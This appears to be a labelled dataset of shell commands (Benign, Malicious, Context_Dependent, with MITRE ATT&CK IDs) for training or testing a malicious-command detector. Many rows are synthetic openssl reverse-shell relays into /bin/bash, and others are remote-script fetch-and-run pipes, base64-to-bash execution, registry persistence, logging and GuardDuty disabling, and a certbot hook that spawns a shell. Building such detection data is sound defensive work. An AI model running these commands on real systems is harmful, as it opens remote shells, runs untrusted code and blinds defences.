command,label,original_label,mitre_id
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:445,Malicious,Synthetic,Synthetic
roll --sum-series {{3{2d5}}},Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:445,Malicious,Synthetic,Synthetic
kaggle [c|competitions] download competition [-f|--file] path/to/file,Benign,Benign,Benign
tcpdump -i enp0s3 port 8888,Context_Dependent,Synthetic,Synthetic
cmctl create certificaterequest my-cr --from-certificate-file cert.yaml --fetch-certificate --timeout 20m,Benign,Benign,Benign
fastlane run build_app,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
theHarvester --domain domain_name --source google --limit 200,Benign,Benign,Benign
pdfcrop path/to/input_file.pdf --resolution 72 path/to/output_file.pdf,Benign,Benign,Benign
GetADUsers.py -all -dc-ip domain_controller_ip domain/username:password,Benign,Benign,Benign
mysql_secure_installation --host host --port port,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:6379,Malicious,Synthetic,Synthetic
arjun -u https://example.com -w path/to/wordlist.txt,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:9002,Malicious,Synthetic,Synthetic
ngrep -d eth0,Benign,Benign,Benign
xkill -button any,Benign,Benign,Benign
pg_recvlogical [-d|--dbname] dbname [-S|--slot] slot_name --create-slot,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:443,Malicious,Synthetic,Synthetic
stat -x path/to/file,Benign,Benign,Benign
orb exec vm_name command,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:9002,Malicious,Synthetic,Synthetic
sshuttle -r deploy@10.10.10.25 0/0,Context_Dependent,Synthetic,Synthetic
find -L . -type l -delete -exec ln -s new_target {} \;,Benign,Benign,Benign
ri File#read,Benign,Benign,Benign
gphoto2 [-L|--list-files],Benign,Benign,Benign
systemctl status postgresql,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:8080,Malicious,Synthetic,Synthetic
xclip [-o|-out] [-se|-selection] [c|clipboard],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
pkg_delete -n package,Benign,Benign,Benign
getTGT.py -aesKey aes_key domain/username,Benign,Benign,Benign
"history | sed ""s/ / $UID /""",Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
"foreach ($ip in 1..255 | % { ""$firstOctet.$secondOctet.$thirdOctet.$_"" } ) {cmd.exe /c nslookup $ip}",Context_Dependent,Malicious,T1018
disown,Benign,Benign,Benign
find . -maxdepth 1 -type d -exec ls -dlrt {} \; | wc --lines,Benign,Benign,Benign
sudo etckeeper unclean,Benign,Benign,Benign
"find ./ -name ""somename.txt""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:995,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:8888,Malicious,Synthetic,Synthetic
slocate -q,Benign,Benign,Benign
dirb https://example.org,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.10:995 user@10.0.0.1,Context_Dependent,Synthetic,Synthetic
lvmpersist remove --ourkey 0xmy_key --removekey 0xother_key --vg vg_name,Benign,Benign,Benign
git bundle verify path/to/file.bundle,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:4445,Malicious,Synthetic,Synthetic
multipass start instance_name,Benign,Benign,Benign
swapoff -a,Malicious,Malicious,T1562
ssh -fN -L 8080:10.0.0.5:110 svcuser@10.10.10.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:9001,Malicious,Synthetic,Synthetic
pulumi cancel stack_name,Benign,Benign,Benign
ctest --output-on-failure [-R|--tests-regex] '^test_name$',Benign,Benign,Benign
typeorm entity:create --name entity --dir path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
sudo nft monitor sets,Benign,Benign,Benign
decaffeinate path/to/file.coffee,Benign,Benign,Benign
sudo zoneadm -z zone_name uninstall,Benign,Benign,Benign
trace -E class-pattern1|class-patter2 method-pattern1|method-pattern2|method-pattern3,Benign,Benign,Benign
getconf CHILD_MAX,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:4445,Malicious,Synthetic,Synthetic
kdash [-t|--tick-rate] 100,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
hardhat clean,Benign,Benign,Benign
Get-Acl path\to\directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:3306,Malicious,Synthetic,Synthetic
lt [-p|--port] 8000,Benign,Benign,Benign
gcloud iam service-accounts create $service-account-name,Malicious,Malicious,T1078
tcpdump -i ens160 -w /tmp/capture.pcap,Context_Dependent,Synthetic,Synthetic
gst-launch-1.0 libcamerasrc camera-name=camera_name ! videoconvert ! autovideosink,Benign,Benign,Benign
wbemtool.exe,Malicious,Malicious,T1047
ssh -fN -L 8080:192.168.1.25:445 user@10.0.0.5,Context_Dependent,Synthetic,Synthetic
<Super Enter>,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:4445,Malicious,Synthetic,Synthetic
aws guardduty delete-detector --detector-id $detectorId,Malicious,Malicious,T1562
gcloud projects create project_id|project_number,Benign,Benign,Benign
llc -relocation-model=pic path/to/input.ll,Benign,Benign,Benign
find /home -depth -print | cpio -ov -0 /dev/rmt0 | tee -a tape.log,Context_Dependent,Benign,Benign
ppmrainbow [-w|-width] width [-h|-height] height color1 color2 ... > path/to/output_file.ppm,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:4445,Malicious,Synthetic,Synthetic
sshuttle -r admin@10.0.0.50 0/0,Context_Dependent,Synthetic,Synthetic
popeye --context context,Benign,Benign,Benign
ioping [-R|-rapid] /dev/sdX,Benign,Benign,Benign
mount [-m|--mkdir] path/to/device_file path/to/target_directory,Context_Dependent,Benign,Benign
yabai -m config window_opacity on,Benign,Benign,Benign
sudo installer -verbose [-pkg|-package] path/to/python-version.pkg [-tgt|-target] /,Benign,Benign,Benign
sam package,Benign,Benign,Benign
"find / -group users -iname ""filename""",Context_Dependent,Benign,Benign
echo 'scale = 10; 5 / 3' | bc,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:3306,Malicious,Synthetic,Synthetic
sudo grub-probe [-t|--target] fs_uuid /boot/grub,Benign,Benign,Benign
composer audit --no-dev,Benign,Benign,Benign
install-tl -profile path/to/texlive.profile,Benign,Benign,Benign
wkhtmltopdf --orientation Landscape|Portrait input.html output.pdf,Benign,Benign,Benign
brew autoremove,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:8081,Malicious,Synthetic,Synthetic
wacaw --to-clipboard,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:6379,Malicious,Synthetic,Synthetic
whatweb --no-errors 192.168.0.0/24,Benign,Benign,Benign
tcpdump -i ens33 -c 9001,Context_Dependent,Synthetic,Synthetic
argospm search --from-lang en,Benign,Benign,Benign
latexmk -dvi /path/to/temp-file,Context_Dependent,Malicious,T1005
mariadb db_name,Benign,Benign,Benign
uwfmgr filter enable|disable,Benign,Benign,Benign
gzip [-v|--verbose] path/to/file.gz,Benign,Benign,Benign
ln -sfv /usr/local/opt/mongodb/*.plist ~/Library/LaunchAgents,Benign,Benign,Benign
hg log [-u|--user] user,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4444,Malicious,Synthetic,Synthetic
comm -23 <(find dir1 | sed 's/dir1/\//'| sort) <(find dir2 | sed 's/dir2/\//'| sort) | sed 's/^\//dir1/',Benign,Benign,Benign
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:prime256v1 -out path/to/private.key,Benign,Benign,Benign
"sudo find / -xdev -type f -size +100000 -name ""*.log"" -exec gzip {} \; -exec echo {} \;",Benign,Benign,Benign
find -cmin -5 | less -R,Benign,Benign,Benign
updatectl check,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
find . -name '.svn' -prune -o -type f -printf '%m%c%p' | md5sum,Benign,Benign,Benign
shopt -u option_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:9090,Malicious,Synthetic,Synthetic
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target_binary"" /v Debugger /d ""$payload_binary""",Malicious,Malicious,T1546
ssh -fN -L 8080:10.10.10.50:995 user@10.0.0.50,Context_Dependent,Synthetic,Synthetic
systemctl is-active firewalld,Context_Dependent,Synthetic,Synthetic
"find /path/with/files -type f -name ""*txt*"" -exec ln -s {} . ';'",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:995,Malicious,Synthetic,Synthetic
mongoexport --uri=connection_string --collection=collection_name,Benign,Benign,Benign
spectacle,Benign,Benign,Benign
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameCon,Malicious,Malicious,T1027
dlv debug,Benign,Benign,Benign
cat ${SPOOL_FILE} | tee -a ${LOG_FILE},Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:53 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:8081,Malicious,Synthetic,Synthetic
wsl-open https://example.com,Benign,Benign,Benign
"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore",Malicious,Malicious,T1070
tldr ykman openpgp,Benign,Benign,Benign
find . -name '*.pl' | xargs grep -L '^use strict',Benign,Benign,Benign
perldoc -L language_code page|module|program|URL,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:4445,Malicious,Synthetic,Synthetic
find /path/to/search -type l -exec test ! -e {} \; -print,Benign,Benign,Benign
rnm -u,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:8081,Malicious,Synthetic,Synthetic
bun pm version,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3306,Malicious,Synthetic,Synthetic
luatex -shell-escape '\directlua{...}\end',Malicious,Malicious,T1548
git apply --cache path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:4445,Malicious,Synthetic,Synthetic
"finger -s | awk '{printf(""%s %s\n"", $1, $2);}'",Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:6379,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
theHarvester -d internal.corp -b google,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8443,Malicious,Synthetic,Synthetic
find . -maxdepth 2 -size +100000 -exec bzip2 {} \;,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:6379,Malicious,Synthetic,Synthetic
pammixinterlace [-f|-filter] linear|fir|ffmpeg path/to/image.ppm > path/to/output.ppm,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:443,Malicious,Synthetic,Synthetic
find / -name 'Metallica*' -exec ls -l {} \;,Context_Dependent,Benign,Benign
oxipng --strip all path/to/file.png,Benign,Benign,Benign
find . -name Chapter1 -type f,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:9002,Malicious,Synthetic,Synthetic
TracerPID,Context_Dependent,Malicious,T1622
fold file | wc -l,Benign,Benign,Benign
yaa archive -a algorithm -d path/to/directory -o path/to/output_file.yaa,Benign,Benign,Benign
cal,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
"net group ""Domain Computers"" /domain",Context_Dependent,Malicious,T1018
udiskie-mount /dev/sdX1,Benign,Benign,Benign
Program Files(x86),Malicious,Malicious,T1485
Start-Process $file1 /S;,Malicious,Malicious,T1219
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:8081,Malicious,Synthetic,Synthetic
find -daystart -mtime -7,Benign,Benign,Benign
tracepath 10.0.0.50,Context_Dependent,Synthetic,Synthetic
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0',Malicious,Malicious,T1059
burpsuite --project-file=path/to/file,Benign,Benign,Benign
"stop-process -name ""chrome"" -force -erroraction silentlycontinue",Malicious,Malicious,T1539
lpadmin -p printer -c class,Benign,Benign,Benign
fc /l path\to\file1 path\to\file2,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:1433,Malicious,Synthetic,Synthetic
lambo new [-l|--link] app_name,Benign,Benign,Benign
csc /out:path/to/file path/to/input_file.cs,Benign,Benign,Benign
help2man executable [-n|--name] name,Benign,Benign,Benign
"su -c ""cd /tmp; curl -s $remote_url | bash"" art",Malicious,Malicious,T1110
mount --bind point mnt,Context_Dependent,Benign,Benign
mpc next,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:22 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
sshuttle -r user@172.20.10.8 0/0,Context_Dependent,Synthetic,Synthetic
find . -type f -perm +111 -print,Benign,Benign,Benign
firewallsd,Malicious,Malicious,T1562
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:8081,Malicious,Synthetic,Synthetic
openclaw onboard [-h|--help],Benign,Benign,Benign
fwupdtool get-devices,Benign,Benign,Benign
balena devices,Benign,Benign,Benign
{12d61a41-4b74-7610-a4d8-3028d2f56395},Malicious,Malicious,T1480
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:8081,Malicious,Synthetic,Synthetic
core-validate-commit [-h|--help],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:5432 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
strace program,Context_Dependent,Benign,Benign
linkchecker --check-extern https://example.com/,Benign,Benign,Benign
command | col [-l|--lines] num,Benign,Benign,Benign
bun run path/to/file|script_name,Benign,Benign,Benign
dsenableroot -u art-tester -p art-tester -r art-root #new user,Malicious,Malicious,T1078
unrar t compressed.rar,Benign,Benign,Benign
sfdk --version,Benign,Benign,Benign
mksquashfs path/to/file_or_directory1 path/to/file_or_directory2 ... filesystem.squashfs -comp gzip|lzo|lz4|xz|zstd|lzma,Benign,Benign,Benign
find ${INPUT_LOCATION} -name '*.pdf.marker' -exec sh -c 'mv $0 `dirname $0`/`basename $0 .marker` $1' {} ${OUTPUT_LOCATION} \;,Benign,Benign,Benign
fold -w30 longline,Benign,Benign,Benign
"peerflix ""torrent_url|magnet_link"" [-a|--all] [-s|--airplay]",Benign,Benign,Benign
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 2",Malicious,Malicious,T1559
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:3389,Malicious,Synthetic,Synthetic
nh search [-c|--channel] nixos-unstable name,Benign,Benign,Benign
kiterunner wordlist list [-o|--output] json,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:8081,Malicious,Synthetic,Synthetic
mac-cleanup [-c|--configure],Benign,Benign,Benign
CSIDL_SYSTEM\cmd.exe /c ping -n 1,Context_Dependent,Malicious,T1016
openssl s_client -quiet -connect 192.168.1.100:445 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
imgp [-x|--res] 1366x1000 path/to/directory path/to/file,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.10:4444 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
find <directory> -type f -size -1M -print0 | xargs -0 rm,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:8081,Malicious,Synthetic,Synthetic
fzf [-q|--query] '!pyc travis',Benign,Benign,Benign
xcaddy build,Benign,Benign,Benign
deb-get remove package,Benign,Benign,Benign
clear,Benign,Benign,Benign
unimatrix --color red|green|blue|white|...,Benign,Benign,Benign
echo $sh_encoded | base64 -d | bash,Malicious,Malicious,T1140
qm [clou|cloudinit] [d|dump] virtual_machine_id meta|network|user,Benign,Benign,Benign
qemu-system-i386 -hda image_name.img -m 4096 -cdrom os_image.iso -boot d,Benign,Benign,Benign
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyEnable /t REG_DWORD /d 1 /f",Malicious,Malicious,T1112
konsole --new-tab,Benign,Benign,Benign
ls -1 | perl -pe 's/\n$/some_delimiter/',Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
"find . -name ""*.java"" -print0 | xargs -0 -J % cp % destinationFolder",Benign,Benign,Benign
"find . -name ""article.xml"" -exec rename 's/article/001_article/;' '{}' \;",Benign,Benign,Benign
argocd app rollback app_name history_id --prune,Benign,Benign,Benign
eim install,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.50:8443 backup@payload.c2,Context_Dependent,Synthetic,Synthetic
sudo postfix reload,Benign,Benign,Benign
xvfb-run command,Benign,Benign,Benign
zcat bigfile.z | tail -n +500 | head -501,Benign,Benign,Benign
"find . | grep -E ""(__pycache__|\.pyc|\.pyo$)"" | xargs rm -rf",Benign,Benign,Benign
Set-AzureAuthentication -ClientID $client_id -ClientSecret $client_secret -TenantID $tenant_id -Environment $environment,Context_Dependent,Malicious,T1526
pocount path/to/file.po,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:143,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:80 svcuser@10.0.0.50,Context_Dependent,Synthetic,Synthetic
sort ip_addresses | uniq -c,Benign,Benign,Benign
npm publish --access restricted,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.1:80 jenkins@10.20.30.40,Context_Dependent,Synthetic,Synthetic
debugfs,Malicious,Malicious,T1059
sshuttle -r support@10.10.10.10 0/0,Context_Dependent,Synthetic,Synthetic
bun init [-m|--minimal],Benign,Benign,Benign
"recsel [-p|--print] name,version data.rec",Benign,Benign,Benign
lb [d|delete],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
"find /store/01 -name ""*.fits"" -exec chmod -x+r {} \; -exec ls -l {} \; | tee ALL_FILES.LOG",Benign,Benign,Benign
tcpdump -i enp0s3 -n,Context_Dependent,Synthetic,Synthetic
HKLM\SOFTWARE\Plus,Malicious,Malicious,T1027
qm [sen|sendkey] --skiplock true vm_id key,Benign,Benign,Benign
"reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application"" /v ""Start"" /t REG_DWORD /d ""0"" /f",Malicious,Malicious,T1562
guetzli input.jpg output.jpg,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:80,Malicious,Synthetic,Synthetic
makoctl dismiss,Benign,Benign,Benign
"mkdir $(printf ""$HOME/Labs/lab4a/folder%03g "" {0..3})",Benign,Benign,Benign
az login [-i|--identity] [-u|--username] /subscriptions/subscription_id/resourcegroups/my_rg/providers/Microsoft.ManagedIdentity/userAssignedIdentities/my_id,Benign,Benign,Benign
find . -size +270M -size -300M,Benign,Benign,Benign
ldd [-u|--unused] path/to/binary,Benign,Benign,Benign
devpod up github.com/user/repo [-i|--ide] vscode,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:9002,Malicious,Synthetic,Synthetic
packwiz refresh,Benign,Benign,Benign
pamflip [-lr|-leftright] path/to/input.pam > path/to/output.pam,Benign,Benign,Benign
gh [a11y|accessibility] [-w|--web],Benign,Benign,Benign
pacrepairfile --help,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:443 user@10.0.0.1,Context_Dependent,Synthetic,Synthetic
nmcli [m|monitor],Benign,Benign,Benign
zola build --output-dir path/to/output_directory/,Benign,Benign,Benign
